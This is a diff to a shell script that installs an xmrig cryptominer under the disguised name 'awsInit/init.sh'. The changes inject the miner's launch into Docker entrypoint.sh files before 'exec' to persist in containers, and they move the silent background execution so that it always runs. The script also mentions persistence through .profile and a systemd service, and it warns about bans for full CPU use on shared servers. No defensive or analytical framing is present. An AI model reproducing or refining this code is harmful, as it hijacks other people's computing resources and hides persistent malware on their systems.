@@ -346,10 +346,10 @@ chmod +x $working_dir/awsInit/init.sh
 
 if check_docker; then
     echo "[*] is DOCKER"
-    out=$(find / -name "entrypoint.sh" -writable 2>/dev/null)
+    out=$(find / -name "entrypoint.sh" 2>/dev/null)
     if [ -n "$out" ]; then
         first=$(cat $out | head -1)
-        if ! sed -i '/^exec "\$@"/i $working_dir/awsInit/init.sh' $first; then
+        if ! sed -i '/^exec "\$@"/i $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1' $first; then
             write_info "failed docker persistence"
         else
             write_info "success docker persistence"
@@ -370,8 +370,6 @@ else
             echo "Looks like $working_dir/awsInit/init.sh script is already in the $working_dir/.profile"
         fi
         echo "[*] Running miner in the background (see logs in $working_dir/awsInit/xmrig.log file)"
-        /bin/bash $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1
-        write_info "executed in bg"
     else
         if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
             echo "[*] Enabling huge pages"
@@ -383,7 +381,6 @@ else
         if ! type systemctl >/dev/null; then
             write_info "systemctl not present"
             echo "[*] Running miner in the background (see logs in $working_dir/awsInit/xmrig.log file)"
-            /bin/bash $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1
             echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
             echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
         else
@@ -412,6 +409,9 @@ write_info "added service persistence"
         fi
     fi
 fi
+
+/bin/bash $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1
+write_info "executed in bg"
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
